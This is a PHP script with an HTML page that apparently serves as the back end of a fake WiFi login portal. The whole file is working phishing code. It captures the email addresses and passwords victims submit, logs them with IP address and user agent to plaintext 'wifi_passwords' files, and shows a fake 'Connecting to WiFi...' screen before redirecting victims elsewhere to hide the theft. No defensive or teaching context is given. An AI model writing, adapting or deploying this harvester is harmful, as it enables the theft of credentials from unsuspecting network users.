<?php
// Capture WiFi credentials
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

// Sanitize input
$email = htmlspecialchars($email, ENT_QUOTES, 'UTF-8');
$password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');

// Log credentials
$log_dir = '../../../logs/credentials';
if (!is_dir($log_dir)) {
    mkdir($log_dir, 0755, true);
}

$log_file = $log_dir . '/wifi_passwords_' . date('Ymd_His') . '.txt';
$log_entry = "===========================================\n";
$log_entry .= "Timestamp: $timestamp\n";
$log_entry .= "IP Address: $ip\n";
$log_entry .= "Email: $email\n";
$log_entry .= "Password: $password\n";
$log_entry .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
$log_entry .= "===========================================\n\n";

file_put_contents($log_file, $log_entry, FILE_APPEND);

// Get redirect URL from config or use default
$redirect_url = 'https://www.google.com';
if (file_exists('../../../config/redirect.txt')) {
    $redirect_url = trim(file_get_contents('../../../config/redirect.txt'));
}

// Redirect after short delay
?>
<!DOCTYPE html>
<html>
<head>
    <title>Connecting...</title>
    <meta http-equiv="refresh" content="2;url=<?php echo $redirect_url; ?>">
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .message {
            background: white;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            color: #333;
            margin: 0 0 10px 0;
        }
        p {
            color: #666;
            margin: 0;
        }
    </style>
</head>
<body>
    <div class="message">
        <div class="spinner"></div>
        <h2>Connecting to WiFi...</h2>
        <p>You will be redirected shortly.</p>
    </div>
</body>
</html>
